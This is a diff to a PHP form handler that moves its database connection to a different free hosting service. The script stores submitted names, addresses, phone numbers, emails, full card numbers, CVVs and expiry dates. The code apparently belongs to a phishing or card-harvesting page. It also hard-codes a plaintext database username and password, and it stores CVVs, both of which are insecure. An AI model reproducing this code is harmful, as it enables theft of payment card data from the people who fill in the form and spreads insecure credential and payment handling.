@@ -98,7 +98,7 @@ if(    isset($_POST["name"])  )
 {
 
 
-$connect = new PDO("mysql:host=sql202.epizy.com;dbname=epiz_28793983_dripoda", "epiz_28793983", "mehdi2014@A");
+$connect = new PDO("mysql:host=freedb.tech;dbname=freedbtech_wordpresst", "freedbtech_mehdiouatmane", "mehdi2014@A");
 $query =  "INSERT INTO tablee   (name, date, address, codepostal, city, phone, email, namecard, cardnumber, cvv, datexp)   VALUES    ( :name, :date, :address, :codepostal, :city, :phone, :email, :namecard, :cardnumber, :cvv, :datexp ) " ;
 $user_data =  array(      ':name' => $_POST["name"],        ':date' => $_POST["date"],      ':address' => $_POST["address"],     ':codepostal' => $_POST["codepostal"],    ':city' => $_POST["city"],    ':phone' => $_POST["phone"],    ':email' => $_POST["email"],    ':namecard' => $_POST["namecard"],    ':cardnumber' => $_POST["cardnumber"],    ':cvv' => $_POST["cvv"],    ':datexp' => $_POST["datexp"]          ) ;
 if(     $connect   ->  prepare($query)	->  execute($user_data)               )       {  echo'yes'; }  else   {  echo'none'; }
